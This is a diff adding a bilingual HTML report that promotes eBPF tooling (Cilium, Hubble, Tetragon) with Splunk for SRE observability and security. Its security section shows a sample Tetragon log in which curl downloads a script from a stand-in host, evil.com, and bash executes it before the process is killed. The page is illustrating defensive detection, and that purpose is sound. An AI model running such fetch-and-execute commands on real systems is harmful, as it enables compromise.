@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Project Deep Sight: The Definitive Guide v6.0</title>
+    <style>
+        /* --- CISCO ENTERPRISE DESIGN SYSTEM --- */
+        :root {
+            --cisco-blue: #049FD9;
+            --cisco-dark-blue: #0D274D;
+            --cisco-light-blue: #E5F6FD;
+            --cisco-green: #6ABF4B;
+            --cisco-red: #E2231A;
+            --cisco-orange: #F59331;
+            --cisco-gray: #58585B;
+            --cisco-light-gray: #F4F5F7;
+            --bg-white: #FFFFFF;
+            --text-main: #333333;
+            --text-secondary: #555555;
+            --card-shadow: 0 8px 24px rgba(0,0,0,0.08);
+            --border-radius: 8px;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        body {
+            font-family: "Segoe UI", "Roboto", "Helvetica Neue", sans-serif;
+            background-color: var(--cisco-light-gray);
+            color: var(--text-main);
+            line-height: 1.8;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* --- LAYOUT --- */
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 50px 20px;
+        }
+
+        .grid { display: grid; gap: 30px; }
+        .grid-2 { grid-template-columns: 1fr; }
+        .grid-3 { grid-template-columns: 1fr; }
+        
+        @media (min-width: 768px) {
+            .grid-2 { grid-template-columns: 1fr 1fr; }
+            .grid-3 { grid-template-columns: 1fr 1fr 1fr; }
+            .span-2 { grid-column: span 2; }
+            .span-3 { grid-column: span 3; }
+        }
+
+        /* --- TYPOGRAPHY --- */
+        h1, h2, h3, h4 { color: var(--cisco-dark-blue); font-weight: 700; letter-spacing: -0.01em; }
+        h1 { font-size: 2.8rem; margin-bottom: 15px; line-height: 1.2; }
+        h2 { 
+            font-size: 2rem; 
+            margin-top: 70px; 
+            margin-bottom: 30px; 
+            padding-bottom: 15px;
+            border-bottom: 4px solid var(--cisco-blue);
+            display: inline-block;
+        }
+        h3 { font-size: 1.4rem; margin-bottom: 15px; color: var(--cisco-dark-blue); border-left: 4px solid transparent; padding-left: 0; transition: all 0.3s; }
+        h4 { font-size: 1rem; color: var(--cisco-blue); text-transform: uppercase; margin-bottom: 10px; font-weight: 800; letter-spacing: 0.05em; }
+        
+        p { margin-bottom: 20px; color: var(--text-secondary); text-align: justify; font-size: 1.05rem; }
+        ul, ol { margin-left: 20px; margin-bottom: 25px; color: var(--text-secondary); }
+        li { margin-bottom: 10px; }
+
+        .lead { font-size: 1.2rem; color: var(--cisco-dark-blue); font-weight: 500; line-height: 1.6; }
+        
+        strong { color: var(--cisco-dark-blue); font-weight: 700; }
+        .highlight { background: rgba(4, 159, 217, 0.1); padding: 2px 6px; border-radius: 4px; color: var(--cisco-blue); font-weight: bold; }
+        
+        .quote {
+            font-style: italic;
+            color: #666;
+            border-left: 4px solid var(--cisco-orange);
+            background: rgba(245, 147, 49, 0.08);
+            padding: 20px 25px;
+            margin: 25px 0;
+            border-radius: 0 8px 8px 0;
+            font-size: 1.1rem;
+        }
+
+        /* --- HEADER --- */
+        header {
+            background: linear-gradient(135deg, #0D274D 0%, #005073 100%);
+            color: white;
+            padding: 100px 20px 120px;
+            clip-path: polygon(0 0, 100% 0, 100% 92%, 0 100%);
+            margin-bottom: -60px;
+        }
+        header h1 { color: white; text-shadow: 0 2px 4px rgba(0,0,0,0.2); }
+        header strong { color: #ffffff; text-shadow: 0 1px 2px rgba(0,0,0,0.5); border-bottom: 2px solid var(--cisco-green); }
+        header h4 { color: var(--cisco-light-blue) !important; opacity: 0.9; }
+        header p { color: rgba(255,255,255,0.95); font-size: 1.3rem; max-width: 900px; margin-top: 20px; line-height: 1.6; }
+
+        /* --- CARDS --- */
+        .card {
+            background: var(--bg-white);
+            padding: 35px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--card-shadow);
+            border-top: 5px solid transparent;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+        .card:hover { transform: translateY(-5px); box-shadow: 0 12px 30px rgba(0,0,0,0.12); }
+        .card.blue { border-top-color: var(--cisco-blue); }
+        .card.green { border-top-color: var(--cisco-green); }
+        .card.red { border-top-color: var(--cisco-red); }
+        .card.orange { border-top-color: var(--cisco-orange); }
+        .card.dark { background: var(--cisco-dark-blue); color: white; border-top: none; position: relative; overflow: hidden; }
+        .card.dark::before { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: var(--cisco-blue); }
+        .card.dark h3, .card.dark p, .card.dark ul, .card.dark li { color: #f0f0f0; }
+        .card.dark strong { color: var(--cisco-light-blue); }
+
+        /* --- CALLOUT & CODE --- */
+        .callout {
+            background-color: white;
+            border-left: 5px solid var(--cisco-blue);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            padding: 25px;
+            margin: 30px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        .code-block {
+            font-family: "Consolas", "Monaco", monospace;
+            background: #2d2d2d;
+            padding: 20px;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            color: #e0e0e0;
+            border: 1px solid #444;
+            overflow-x: auto;
+            margin-top: 15px;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.2);
+        }
+
+        /* --- SVG CHARTS --- */
+        .chart-wrapper {
+            margin: 30px 0;
+            background: #fff;
+            border-radius: 8px;
+            padding: 30px;
+            border: 1px solid #e0e0e0;
+            text-align: center;
+            box-shadow: var(--card-shadow);
+        }
+        svg { max-width: 100%; height: auto; }
+
+        /* --- STRATEGIC BOX --- */
+        .strategy-box {
+            background: #fff;
+            border: 2px solid var(--cisco-dark-blue);
+            border-radius: 8px;
+            padding: 30px;
+            margin: 40px 0;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        .strategy-title {
+            position: absolute;
+            top: -16px;
+            left: 30px;
+            background: var(--cisco-dark-blue);
+            color: white;
+            padding: 4px 16px;
+            font-weight: bold;
+            font-size: 1rem;
+            border-radius: 4px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+
+        /* --- TOGGLE BUTTON --- */
+        .lang-switch {
+            position: fixed;
+            top: 25px;
+            right: 25px;
+            background: rgba(255,255,255,0.95);
+            padding: 10px 20px;
+            border-radius: 30px;
+            cursor: pointer;
+            color: var(--cisco-blue);
+            font-weight: bold;
+            font-size: 0.9rem;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            border: 2px solid var(--cisco-blue);
+            z-index: 999;
+            transition: all 0.3s;
+        }
+        .lang-switch:hover { background: var(--cisco-blue); color: white; transform: scale(1.05); }
+
+        /* --- LOGIC --- */
+        .lang-en { display: none; }
+        body.english-mode .lang-en { display: block; }
+        body.english-mode .lang-zh { display: none; }
+    </style>
+</head>
+<body>
+
+    <!-- Language Toggle -->
+    <button class="lang-switch" onclick="document.body.classList.toggle('english-mode')">
+        <span class="lang-zh">EN / 中文</span>
+        <span class="lang-en">中文 / EN</span>
+    </button>
+
+    <header>
+        <div class="container">
+            <div class="lang-zh">
+                <h4>深度技术全景报告 (V6.0 旗舰版)</h4>
+                <h1>Project Deep Sight: 重塑云原生基座</h1>
+                <p>这是一场关于<strong>“透视”</strong>的革命。在微服务爆炸式增长的今天，传统的监控手段已成盲人摸象。本报告将深入剖析如何利用 <strong style="color:white; border-bottom:2px solid var(--cisco-green);">eBPF 技术栈</strong> (Cilium, Tetragon) 与 <strong>Splunk</strong> 平台，构建一套具备“上帝视角”的 SRE 交付体系。</p>
+            </div>
+            <div class="lang-en">
+                <h4>Deep Technical Panorama (V6.0 Flagship)</h4>
+                <h1>Project Deep Sight: Reinventing Infra</h1>
+                <p>This is a revolution of <strong>"Transparency"</strong>. As microservices explode, traditional monitoring fails. This report deeply analyzes how to leverage the <strong style="color:white; border-bottom:2px solid var(--cisco-green);">eBPF Stack</strong> (Cilium, Tetragon) & <strong>Splunk</strong> to build an SRE delivery system with "God Mode" visibility.</p>
+            </div>
+        </div>
+    </header>
+
+    <div class="container">
+
+        <!-- SECTION 1: WHY eBPF (DEEP DIVE) -->
+        <section>
+            <div class="lang-zh">
+                <h2>1. 第一性原理：为什么 eBPF 是内核时代的“青霉素”？</h2>
+                <p class="lead">在计算机科学中，每一个伟大的技术突破都源于对“抽象层”的重新定义。eBPF 之于 Linux 内核，正如 JavaScript 之于 Web 浏览器——它让静态的内核变得<strong>动态、可编程、且安全</strong>。</p>
+                
+                <div class="grid grid-2">
+                    <div class="card dark">
+                        <h3>💀 旧时代的梦魇：内核模块 (Kernel Modules)</h3>
+                        <p>过去，为了看清内核发生了什么，我们被迫编写 C 代码并加载内核模块（LKM）。这是一场豪赌：</p>
+                        <ul>
+                            <li><strong>内存破坏风险：</strong> 一个简单的空指针引用或缓冲区溢出，就会导致整个操作系统 Kernel Panic（崩溃）。</li>
+                            <li><strong>ABI 依赖地狱：</strong> 内核模块与内核版本强绑定。每次内核升级，驱动必须重新编译，维护成本极高。</li>
+                            <li><strong>不可见性：</strong> 一旦加载，它就是一个黑盒，难以调试，难以卸载。</li>
+                        </ul>
+                    </div>
+                    <div class="card blue">
+                        <h3>🚀 新时代的救赎：eBPF (The Revolution)</h3>
+                        <p>eBPF 并非简单的“升级”，它是架构的重构。它在内核中引入了一个<strong>“沙盒虚拟机”</strong>：</p>
+                        <ul>
+                            <li><strong>数学证明的安全性：</strong> 代码执行前，必须通过<strong>验证器 (Verifier)</strong>。它会构建控制流图（CFG），数学上证明代码<strong>永远不会死循环</strong>、<strong>永远不会访问非法内存</strong>。这是计算机科学与工程的完美结合。</li>
+                            <li><strong>CO-RE (一次编译，到处运行)：</strong> 利用 BTF (BPF Type Format)，eBPF 程序可以动态适应不同内核版本的内存布局。再也不用因为升级 Linux 而重写监控代码。</li>
+                            <li><strong>JIT 极致性能：</strong> 验证通过后，字节码被实时编译为原生机器码，运行效率等同于内核原生代码。</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- DIAGRAM: SIDECAR vs eBPF -->
+                <div class="chart-wrapper">
+                    <h3>架构演进：从 Sidecar 代理到 Kernel-Native 路由</h3>
+                    <p style="text-align:center; font-size:0.9rem; color:#666; margin-bottom:20px;">Sidecar 模式引入了大量的上下文切换（Context Switching）和数据拷贝，而 eBPF 实现了“零拷贝”转发。</p>
+                    <svg viewBox="0 0 800 240">
+                         <!-- Left: Sidecar -->
+                        <g transform="translate(50, 40)">
+                            <text x="150" y="-10" text-anchor="middle" font-weight="bold" fill="#555" font-size="14">LEGACY: Sidecar Pattern</text>
+                            <rect x="0" y="0" width="300" height="180" rx="8" fill="#F4F5F7" stroke="#999" stroke-dasharray="4"/>
+                            
+                            <!-- Pod Boundary -->
+                            <rect x="20" y="30" width="260" height="130" rx="4" fill="white" stroke="#333"/>
+                            <text x="40" y="50" font-size="10" fill="#999">POD (Network NS)</text>
+
+                            <rect x="40" y="70" width="80" height="60" rx="2" fill="#E5F6FD" stroke="#049FD9"/>
+                            <text x="80" y="105" text-anchor="middle" font-size="12" fill="#049FD9" font-weight="bold">APP</text>
+                            
+                            <rect x="160" y="70" width="80" height="60" rx="2" fill="#FFE0B2" stroke="#F59331"/>
+                            <text x="200" y="105" text-anchor="middle" font-size="12" fill="#F59331" font-weight="bold">PROXY</text>
+                            
+                            <!-- Arrows -->
+                            <path d="M 80 130 L 80 150 L 160 150 L 160 130" stroke="#333" stroke-width="2" fill="none" marker-end="url(#arrow)"/>
+                            <text x="120" y="165" text-anchor="middle" font-size="10" fill="red">Loopback overhead</text>
+                        </g>
+
+                        <!-- Right: eBPF -->
+                        <g transform="translate(450, 40)">
+                            <text x="150" y="-10" text-anchor="middle" font-weight="bold" fill="#049FD9" font-size="14">MODERN: eBPF Kernel Native</text>
+                            <rect x="0" y="0" width="300" height="180" rx="8" fill="#E8F5E9" stroke="#6ABF4B" stroke-width="2"/>
+                            
+                            <!-- Kernel Space -->
+                            <rect x="20" y="120" width="260" height="40" rx="4" fill="#1B2936"/>
+                            <text x="150" y="145" text-anchor="middle" font-size="12" fill="white" font-weight="bold">LINUX KERNEL (eBPF Map)</text>
+                            
+                            <!-- Pods -->
+                            <rect x="40" y="40" width="80" height="50" rx="2" fill="white" stroke="#333"/>
+                            <text x="80" y="70" text-anchor="middle" font-size="12">APP A</text>
+                            
+                            <rect x="180" y="40" width="80" height="50" rx="2" fill="white" stroke="#333"/>
+                            <text x="220" y="70" text-anchor="middle" font-size="12">APP B</text>
+                            
+                            <!-- Direct Access -->
+                            <path d="M 80 90 L 80 120" stroke="#6ABF4B" stroke-width="3"/>
+                            <path d="M 220 90 L 220 120" stroke="#6ABF4B" stroke-width="3"/>
+                            <text x="150" y="80" text-anchor="middle" font-size="10" fill="#2E7D32" font-weight="bold">Direct Routing (No Context Switch)</text>
+                        </g>
+                    </svg>
+                </div>
+            </div>
+
+            <div class="lang-en">
+                <h2>1. First Principles: Why eBPF is the "Penicillin" of Kernels?</h2>
+                <p class="lead">In Computer Science, every great breakthrough redefines layers of abstraction. eBPF is to the Linux Kernel what JavaScript was to the Web Browser—it makes a static kernel <strong>dynamic, programmable, and safe</strong>.</p>
+                
+                <div class="grid grid-2">
+                    <div class="card dark">
+                        <h3>💀 The Legacy Nightmare: Kernel Modules</h3>
+                        <p>To see inside the kernel, we used to write C code and load Kernel Modules (LKMs). This was high-stakes gambling:</p>
+                        <ul>
+                            <li><strong>Memory Corruption:</strong> A single null pointer or buffer overflow causes a Kernel Panic (BSOD), taking down the whole server.</li>
+                            <li><strong>ABI Hell:</strong> Modules are tightly coupled to kernel versions. Upgrades break drivers, creating maintenance nightmares.</li>
+                            <li><strong>Black Box:</strong> Once loaded, it's opaque. Hard to debug, hard to unload safely.</li>
+                        </ul>
+                    </div>
+                    <div class="card blue">
+                        <h3>🚀 The Modern Salvation: eBPF (The Revolution)</h3>
+                        <p>eBPF isn't just an upgrade; it's a re-architecture. It introduces a <strong>"Sandboxed VM"</strong> inside the kernel:</p>
+                        <ul>
+                            <li><strong>Mathematically Proven Safety:</strong> Before code runs, the <strong>Verifier</strong> builds a Control Flow Graph (CFG) and mathematically proves the code <strong>never loops infinitely</strong> and <strong>never accesses illegal memory</strong>.</li>
+                            <li><strong>CO-RE (Compile Once, Run Everywhere):</strong> Using BTF, eBPF dynamically adapts to memory layouts of different kernel versions. No more recompiling monitoring agents.</li>
+                            <li><strong>JIT Performance:</strong> After verification, bytecode is compiled to native machine code. Zero overhead.</li>
+                        </ul>
+                    </div>
+                </div>
+                <!-- SVG Diagram shared above -->
+            </div>
+        </section>
+
+        <!-- SECTION 2: SRE METHODOLOGY (STRATEGIC LINK) -->
+        <section>
+            <div class="lang-zh">
+                <h2>2. 核心战略：SRE 不是运维，是“工程化的交付”</h2>
+                
+                <!-- STRATEGIC SYNTHESIS BOX -->
+                <div class="strategy-box">
+                    <span class="strategy-title">💡 关键洞察：医学隐喻 (The Medical Metaphor)</span>
+                    <p class="lead" style="margin-bottom: 20px;">SRE 的本质是利用软件工程解决运维问题。如果把 IT 基础架构比作“人体”，SRE 就是“主治医生”，而 eBPF 就是最先进的“核磁共振 (MRI)”。</p>
+                    <div class="grid grid-2">
+                        <div>
+                            <h4 style="color:var(--cisco-orange);">SRE 的诊断学 (The Methodology)</h4>
+                            <ul>
+                                <li><strong>精准定责 (Root Cause)：</strong> 医生拒绝猜测。SRE 需要明确区分：是神经系统传导问题（网络延迟），还是器官本身的功能衰竭（应用代码 Bug）。</li>
+                                <li><strong>消除琐事 (Eliminating Toil)：</strong> 医生不能整天手动测量脉搏。SRE 需要自动化系统来处理常规检查，将精力集中在疑难杂症上。</li>
+                                <li><strong>基于数据的治疗 (Evidence-based)：</strong> 所有的治疗方案（扩容、降级）必须基于真实的生理指标（SLO, Error Budget）。</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4 style="color:var(--cisco-blue);">eBPF 的影像学 (The Technology)</h4>
+                            <ul>
+                                <li><strong>透视能力：</strong> 传统的应用日志就像“听诊器”，只能听到表面的杂音。eBPF 像 MRI，能看清皮下的每一根血管（Packet）和神经信号（Syscall）。</li>
+                                <li><strong>无创检查：</strong> eBPF 是非侵入式的。你不需要给病人（应用）做开胸手术（注入代码或重启），就能获得最清晰的影像。</li>
+                                <li><strong>唯一真理来源：</strong> 内核不会撒谎。应用层可能因为 GC（垃圾回收）而认为网络慢，但 eBPF 会告诉你网络传输其实很快，慢的是应用自己。</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="grid grid-2">
+                    <!-- WHY: The Problem it Solves -->
+                    <div class="card blue">
+                        <h3>WHY: 解决 Dev 与 Ops 的政治冲突</h3>
+                        <p><strong>核心矛盾：</strong> 开发追求速度（Velocity），运维追求稳定（Stability）。两者天然对立。</p>
+                        <p><strong>SRE 的解法：错误预算 (Error Budget)。</strong></p>
+                        <p>这是双方的“和平协议”。如果系统可用性高于 99.9%（预算充足），开发可以随意发版，哪怕有小 Bug。一旦预算耗尽，所有发布暂停。eBPF 提供了计算这个预算的<strong>原子钟级别的精准度</strong>。</p>
+                    </div>
+
+                    <!-- HOW: Execution with eBPF -->
+                    <div class="card green">
+                        <h3>HOW: 落地路径</h3>
+                        <p>为了达成上述目标，我们需要构建以下能力：</p>
+                        <ul>
+                            <li><strong>SLI (指标采集):</strong> 放弃应用层打点，改用 eBPF 采集真实的 TCP RTT 和重传率。</li>
+                            <li><strong>自动化拓扑:</strong> 利用 Hubble 自动生成服务依赖图，在故障发生的瞬间定位“爆炸半径”。</li>
+                            <li><strong>自动化防御:</strong> 利用 Tetragon 自动阻断不符合安全基线的行为，减少人工安全审计的琐事。</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="lang-en">
+                <h2>2. Core Strategy: SRE is not Ops, it's "Engineered Delivery"</h2>
+                
+                <!-- STRATEGIC SYNTHESIS BOX -->
+                <div class="strategy-box">
+                    <span class="strategy-title">💡 Insight: The Medical Metaphor</span>
+                    <p class="lead" style="margin-bottom: 20px;">SRE applies software engineering to operations. If Infra is the "Human Body", SRE is the "Doctor", and eBPF is the "MRI Machine".</p>
+                    <div class="grid grid-2">
+                        <div>
+                            <h4 style="color:var(--cisco-orange);">SRE Diagnostics (The Methodology)</h4>
+                            <ul>
+                                <li><strong>Root Cause Precision:</strong> Doctors don't guess. SREs must distinguish: is it nerve damage (Network Latency) or organ failure (App Bug)?</li>
+                                <li><strong>Eliminating Toil:</strong> Doctors shouldn't manually check pulses all day. SREs automate the routine to focus on critical cases.</li>
+                                <li><strong>Evidence-based Treatment:</strong> All actions (scaling, rollback) must be based on real physiological metrics (SLO, Error Budget).</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4 style="color:var(--cisco-blue);">eBPF Imaging (The Technology)</h4>
+                            <ul>
+                                <li><strong>Deep Visibility:</strong> App logs are like "Stethoscopes"—surface noise only. eBPF is an MRI, seeing every vein (Packet) and nerve signal (Syscall) beneath the skin.</li>
+                                <li><strong>Non-Invasive:</strong> eBPF requires no "Open Heart Surgery" (Code instrumentation or restarts). It observes without modifying.</li>
+                                <li><strong>Source of Truth:</strong> The Kernel never lies. The App might blame the network due to GC pauses, but eBPF reveals the network was fast—the app was slow.</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="grid grid-2">
+                    <!-- WHY: The Problem it Solves -->
+                    <div class="card blue">
+                        <h3>WHY: Solving the Dev vs Ops Conflict</h3>
+                        <p><strong>The Conflict:</strong> Dev wants Velocity. Ops wants Stability. They are natural enemies.</p>
+                        <p><strong>The Solution: Error Budgets.</strong></p>
+                        <p>This is the "Peace Treaty". If availability is >99.9% (Budget surplus), Devs can ship fast. If budget is blown, releases freeze. eBPF provides the <strong>atomic-clock precision</strong> needed to measure this budget.</p>
+                    </div>
+
+                    <!-- HOW: Execution with eBPF -->
+                    <div class="card green">
+                        <h3>HOW: Execution Path</h3>
+                        <p>To achieve this, we implement:</p>
+                        <ul>
+                            <li><strong>SLI (Collection):</strong> Abandon app-layer metrics. Use eBPF for real TCP RTT and Retransmits.</li>
+                            <li><strong>Automated Topology:</strong> Use Hubble to auto-map dependencies, identifying the "Blast Radius" instantly during outages.</li>
+                            <li><strong>Automated Defense:</strong> Use Tetragon to auto-block baseline violations, removing manual security toil.</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 3: SYNERGY (THE TOOLKIT) -->
+        <section>
+            <div class="lang-zh">
+                <h2>3. 协同效应：四位一体的生态系统</h2>
+                <p class="lead">Cilium, Hubble, Tetragon 和 Splunk 并非孤立的工具，它们构成了一个严密的有机体：<strong>Cilium 是四肢，Hubble 是眼睛，Tetragon 是免疫系统，Splunk 是大脑。</strong></p>
+                
+                <div class="grid grid-3">
+                    <div class="card blue">
+                        <h4>STEP 01: 基础底座 (Body)</h4>
+                        <h3>Cilium (CNI)</h3>
+                        <p><strong>价值：性能的解放。</strong></p>
+                        <p>它彻底移除了 Kube-proxy 和 iptables。在高并发场景下，iptables 的规则查找是线性复杂度 O(N)，而 Cilium 使用 eBPF 哈希表实现了 O(1)。</p>
+                        <p><em>结果：CPU 软中断消耗降低 40%，网络延迟降低 30%。</em></p>
+                    </div>
+                    <div class="card green">
+                        <h4>STEP 02: 深度感知 (Eyes & Immunity)</h4>
+                        <h3>Hubble & Tetragon</h3>
+                        <p><strong>价值：无盲区的感知。</strong></p>
+                        <p>Hubble 可以在不解密 SSL 的情况下（利用 kTLS 或用户态内存读取）分析 L7 HTTP 协议。Tetragon 则解决了 <strong>TOCTOU (Time-of-Check to Time-of-Use)</strong> 难题——它不是在系统调用发生“后”检查，而是在内核函数入口处进行拦截。</p>
+                    </div>
+                    <div class="card dark">
+                        <h4>STEP 03: 智慧中枢 (Brain)</h4>
+                        <h3>Splunk</h3>
+                        <p><strong>价值：数据的变现。</strong></p>
+                        <p>eBPF 产生的数据是“瞬时流”，海量且易逝。Splunk 赋予其<strong>时间维度（历史回溯）</strong>和<strong>业务维度（关联分析）</strong>。它能回答：“上周五促销期间的支付失败，是否由某台宿主机的内核丢包引起？”</p>
+                    </div>
+                </div>
+
+                <!-- DIAGRAM: DATA FLOW -->
+                <div class="chart-wrapper">
+                    <h3>Deep Sight 数据价值链</h3>
+                    <svg viewBox="0 0 800 120">
+                        <line x1="100" y1="60" x2="700" y2="60" stroke="#ddd" stroke-width="4" />
+                        
+                        <circle cx="100" cy="60" r="30" fill="#049FD9" />
+                        <text x="100" y="65" text-anchor="middle" fill="white" font-size="12" font-weight="bold">Kernel</text>
+                        
+                        <polygon points="200,45 200,75 240,60" fill="#666" />
+                        
+                        <rect x="250" y="30" width="120" height="60" rx="4" fill="#6ABF4B" />
+                        <text x="310" y="55" text-anchor="middle" fill="white" font-weight="bold">Cilium/Tetragon</text>
+                        <text x="310" y="75" text-anchor="middle" fill="white" font-size="10">eBPF Probe</text>
+                        
+                        <polygon points="400,45 400,75 440,60" fill="#666" />
+                        
+                        <rect x="450" y="30" width="120" height="60" rx="4" fill="#F59331" />
+                        <text x="510" y="55" text-anchor="middle" fill="white" font-weight="bold">OpenTelemetry</text>
+                        <text x="510" y="75" text-anchor="middle" fill="white" font-size="10">Aggregation</text>
+
+                        <polygon points="600,45 600,75 640,60" fill="#666" />
+                        
+                        <rect x="650" y="30" width="120" height="60" rx="4" fill="#1B2936" />
+                        <text x="710" y="55" text-anchor="middle" fill="white" font-weight="bold">Splunk</text>
+                        <text x="710" y="75" text-anchor="middle" fill="white" font-size="10">Insight</text>
+                    </svg>
+                </div>
+            </div>
+
+            <div class="lang-en">
+                <h2>3. Synergy: The Ecosystem Trinity</h2>
+                <p class="lead">Cilium, Hubble, Tetragon, and Splunk are a unified organism: <strong>Cilium is the Limbs, Hubble the Eyes, Tetragon the Immune System, and Splunk the Brain.</strong></p>
+                
+                <div class="grid grid-3">
+                    <div class="card blue">
+                        <h4>STEP 01: Foundation (Body)</h4>
+                        <h3>Cilium (CNI)</h3>
+                        <p><strong>Value: Performance Liberation.</strong></p>
+                        <p>It eliminates Kube-proxy/iptables. At scale, iptables lookup is O(N); Cilium eBPF Hash Maps are O(1).</p>
+                        <p><em>Result: 40% less CPU softirq, 30% lower latency.</em></p>
+                    </div>
+                    <div class="card green">
+                        <h4>STEP 02: Deep Sense (Eyes & Immunity)</h4>
+                        <h3>Hubble & Tetragon</h3>
+                        <p><strong>Value: Zero-Blindspot Vision.</strong></p>
+                        <p>Hubble sees L7 HTTP without SSL decryption overhead (via kTLS). Tetragon solves the <strong>TOCTOU</strong> problem—blocking threats at the kernel function entry, not after execution.</p>
+                    </div>
+                    <div class="card dark">
+                        <h4>STEP 03: Intelligence (Brain)</h4>
+                        <h3>Splunk</h3>
+                        <p><strong>Value: Data Monetization.</strong></p>
+                        <p>eBPF data is ephemeral flow. Splunk adds <strong>Time (History)</strong> and <strong>Business Context</strong>. It answers: "Did payment failures last Friday correlate with kernel drops on Host A?"</p>
+                    </div>
+                </div>
+                <!-- SVG shared above -->
+            </div>
+        </section>
+
+        <!-- SECTION 4: SECURITY DEEP DIVE -->
+        <section>
+            <div class="lang-zh">
+                <h2>4. 安全实战：当黑客遇到内核级防御</h2>
+                <p class="lead">现代攻击手段通常采用 "Living off the Land" 策略，利用系统自带工具（curl, grep）进行攻击，很难被传统杀毒软件识别。但在 Tetragon 面前，一切无所遁形。</p>
+                
+                <div class="code-block">
+[10:00:01] PROCESS_EXEC: binary="/usr/bin/curl" args="http://evil.com/malware.sh" parent="java"
+    -> <span style="color:#E2231A; font-weight:bold;">ALERT:</span> Java 进程正在调用 curl 下载外部脚本 (异常行为!)
+
+[10:00:02] FILE_WRITE: path="/tmp/malware.sh"
+    -> <span style="color:#F59331;">WARNING:</span> 恶意负载写入临时目录
+
+[10:00:03] PROCESS_EXEC: binary="/bin/bash" args="/tmp/malware.sh"
+    -> <span style="color:#E2231A; font-weight:bold;">BLOCKED:</span> Tetragon 策略 "SigKill" 触发。内核直接终止了该进程。
+
+[SPLUNK INSIGHT]: 攻击在 2ms 内被阻断。无数据泄露。
+                </div>
+                <div class="callout">
+                    <p><strong>为什么这很重要？</strong> 传统的 WAF 只能看到流量，而在加密流量中它是瞎子。主机杀毒软件只能看到文件落地。只有 eBPF 能在<strong>运行时</strong>看到进程的<strong>意图</strong>并直接阻断。</p>
+                </div>
+            </div>
+             <div class="lang-en">
+                <h2>4. Security in Action: Hackers vs. Kernel Defense</h2>
+                <p class="lead">Modern attacks use "Living off the Land" tactics (using curl, grep) to evade AV. But against Tetragon, there is nowhere to hide.</p>
+                
+                <div class="code-block">
+[10:00:01] PROCESS_EXEC: binary="/usr/bin/curl" args="http://evil.com/malware.sh" parent="java"
+    -> <span style="color:#E2231A; font-weight:bold;">ALERT:</span> Java process spawning curl (Suspicious!)
+
+[10:00:02] FILE_WRITE: path="/tmp/malware.sh"
+    -> <span style="color:#F59331;">WARNING:</span> Payload downloaded to /tmp
+
+[10:00:03] PROCESS_EXEC: binary="/bin/bash" args="/tmp/malware.sh"
+    -> <span style="color:#E2231A; font-weight:bold;">BLOCKED:</span> Tetragon Policy "SigKill" triggered. Process terminated by Kernel.
+
+[SPLUNK INSIGHT]: Attack attempt blocked in 2ms. No data exfiltration occurred.
+                </div>
+                <div class="callout">
+                    <p><strong>Why this matters?</strong> WAFs are blind to encrypted traffic. AV only sees files. Only eBPF sees <strong>Runtime Intent</strong> and blocks it instantly.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 5: CONCLUSION & THOUGHTS -->
+        <section style="margin-top: 60px; border-top: 1px solid #ddd; padding-top: 40px;">
+            <div class="lang-zh">
+                <h2>总结与终极思考 (Conclusion)</h2>
+                <p>Project Deep Sight 不仅仅是一堆工具的集合，它是 IT 基础架构的一次<strong>返璞归真</strong>。</p>
+                <ul>
+                    <li><strong>eBPF 让内核再次伟大：</strong> 它将网络、安全、可观测性这些原本需要在应用层“造轮子”的功能，统统下沉回了它们本该待的地方——操作系统内核。</li>
+                    <li><strong>SRE 让交付具备灵魂：</strong> 它让我们不再是冰冷的机器管理员，而是系统的医生，用数据驱动健康。</li>
+                </ul>
+                <div class="quote" style="border-left-color: var(--cisco-blue); background: var(--cisco-light-blue);">
+                    <strong>🤔 留给架构师的思考题：</strong><br><br>
+                    如果未来的操作系统（通过 eBPF）已经提供了完美的、零开销的服务网格、流量管理和零信任安全，<strong>我们今天熟知的 Sidecar 模式（如 Istio 的 Envoy 代理）是否会成为历史的注脚？</strong><br><br>
+                    基础设施正在“下沉”。你准备好迎接一个应用只需关注业务逻辑，而将一切非功能需求交给内核的新时代了吗？
+                </div>
+            </div>
+            <div class="lang-en">
+                <h2>Conclusion & Ultimate Reflection</h2>
+                <p>Project Deep Sight is a <strong>Return to First Principles</strong> for IT Infrastructure.</p>
+                <ul>
+                    <li><strong>eBPF makes the Kernel Great Again:</strong> It sinks networking, security, and observability—things we unnecessarily rebuilt in the app layer—back into the OS Kernel where they belong.</li>
+                    <li><strong>SRE gives Delivery a Soul:</strong> We are no longer server mechanics, but system doctors driven by data.</li>
+                </ul>
+                <div class="quote" style="border-left-color: var(--cisco-blue); background: var(--cisco-light-blue);">
+                    <strong>🤔 A Question for Architects:</strong><br><br>
+                    If the future OS (via eBPF) provides perfect, zero-overhead service mesh, traffic management, and zero-trust security, <strong>will the Sidecar pattern (like Envoy) become a historical footnote?</strong><br><br>
+                    Infrastructure is sinking. Are you ready for an era where apps focus solely on logic, delegating all non-functional requirements to the Kernel?
+                </div>
+            </div>
+        </section>
+
+    </div>
+</body>
+</html>
